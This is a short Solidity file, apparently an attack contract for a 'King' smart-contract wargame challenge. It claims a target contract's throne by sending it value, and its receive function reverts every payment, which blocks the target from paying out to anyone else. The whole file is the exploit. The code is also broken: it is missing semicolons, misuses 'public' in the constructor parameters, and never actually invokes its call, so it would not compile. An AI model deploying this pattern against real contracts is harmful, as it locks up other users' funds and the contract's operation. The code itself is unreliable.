// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract HackKing {
  address public kingContract;

  constructor(address public _kingContract) public payable {
    kingContract = _kingContract
  }

  function crownMe(uint value) {
    address(kingContract).call.value(value)
  }

  receive() external payable {
    revert()
  }

}
